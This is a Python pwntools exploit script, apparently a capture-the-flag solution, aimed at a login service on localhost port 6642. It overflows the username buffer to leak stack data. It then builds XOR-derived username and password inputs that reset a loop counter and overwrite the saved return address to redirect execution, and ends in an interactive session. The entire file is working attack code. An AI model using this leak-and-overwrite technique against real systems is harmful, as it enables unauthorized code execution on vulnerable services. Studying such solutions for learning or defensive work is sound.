from pwn import * 

p = remote('127.0.0.1', 6642) 

#pause() 

# The only two values that matter are the iter (password[32]) and the return address (password[37])
# The iterator should be written to be 0. 
# The return address should be written to the current value + 48A
def write_val(username,password):
    '''
    u = username 
    p = password 
    iter[0] = u[0] ^ p[0] ^ iter[0]
    ....
    iter[3] = u[3] ^ p[3] ^ iter[3]
    '''
    p.recvuntil('Enter your username') 
    p.sendline(username)
    p.recvuntil('Enter your password:') 
    p.sendline(password)
    p.interactive() 

# Translates the bits into the values that we want 
def xor_trans(cur, want): 
    
    # The first two could either be 0's or 1's; as long as they are the same
    if(cur == 0 and want == 0): 
        return 1,1 
    elif(cur == 1 and want == 1): 
        return 1,1 
    else: 
        # For the different cases, just 1 needs to be different
        return 0,1

# Deals with a single byte of input!
def get_user_pass_byte(current, want):
    packer = make_unpacker(8, endian='big', sign='unsigned')
    current = format(packer(current),'08b')
    want = format(packer(want),'08b')
    u_byte = ''
    p_byte = ''
    for c,w in zip(current, want):
        u,p = xor_trans(int(c), int(w)) 
        u_byte += str(u) 
        p_byte += str(p)
    return int(u_byte,2), int( p_byte, 2)

# Takes in 4 bytes of input
def get_username_password(current,want):
    username = ''
    password = ''
    for index in range(len(current)): 
        # Grab a single byte
        c = current[index]
        w = want[index]
        
        # Get the username and password values for the byte
        u, p = get_user_pass_byte(c,w)
        username += p8(u) 
        password += p8(p) 
        packer = make_unpacker(8, endian='big', sign='unsigned')
        
        if(u == 0x0 or p == 0x0):
            print "0!!"
        c = packer(c) 
        w = packer(w) 
        final = u ^ p ^ c   
        print 'Username : ' + hex(u), 'Password: ' + hex(p), 'Cur: ' + hex(c), 'Final: ' + hex(final), 'Want: ' + hex(w)
    
    return username, password

# The first part of the payload
def initial_leak(char): 
    p.recvuntil('Enter your username') 
    p.sendline(char * 90)
    p.recvuntil('Enter your password:') 
    p.sendline('\x01' * 32)
    p.recvuntil(char * 32) 
    
    # Leak the values on the stack
    leak = p.recv() 
    leak = leak[32:] 
    leaked_string = ""
    tmp_string_1 = ""
    tmp_string_2 = ""
    actual_string = ""
    index = 0
    for char in leak: 
        
        actual = ord(char) ^ 0x3
        if(index % 4 == 0 and index != 0):
            tmp_string_1 = tmp_string_1[::-1]
            tmp_string_2 = tmp_string_2[::-1]
            #for i in range(4):
            #    print hex(ord(tmp_string_1[i])),
            #print 
            leaked_string += tmp_string_1
            actual_string += tmp_string_2
            tmp_string_1 = ''
            tmp_string_2 = ''
        tmp_string_1 += chr(actual)
        tmp_string_2 += char
        
        index += 1

    return leaked_string, actual_string
'''
c = '\xff'
w = '\x01'
u, p = get_user_pass_byte(c,w)
packer = make_unpacker(8, endian='big', sign='unsigned')

c = packer(c) 
w = packer(w) 
final = u ^ p ^ c
print final, w
'''

current, original = initial_leak('\x02') 

# Get the login return address to jump to
ret = current[20:24]
print "Ret..."
ret_write = original[20:24]
for char in ret_write: 
    print hex(ord(char)) 

iteration = original[4:8]

packer = make_unpacker(32, endian='big', sign='unsigned')
packer2 = make_packer(32, endian='little', sign='unsigned') 
print 'Leaked Address: ', hex(packer(ret)), hex((packer(ret) - 0x48A))
new_ret  = packer2(packer(ret) - 0x48A)
iteration = packer2(packer(iteration) + 0x1) 
#print packer(iteration) 

# Generate the final payload
# Set the iterator
u_input_0, p_input_0 = get_username_password(iteration, "\x00\x00\x00\x00")
# Set the ret address
u_input_6, p_input_6 = get_username_password(ret_write[::-1], new_ret) 

username = "\x01" * 4 + u_input_0 + "\x01" * 12 + u_input_6 + "\x01" * 8
password = "\x02" * 4 + p_input_0 + "\x02" * 12 + p_input_6 + "\x02" * 8

print "Username..." 
for index in range(len(username)):
    print index, "-", hex(ord(username[index])), '|||',
print

print "Password..." 
for index in range(len(username)):
    print index, "-", hex(ord(password[index])), '|||',
print
write_val(username, password)
p.interactive() 

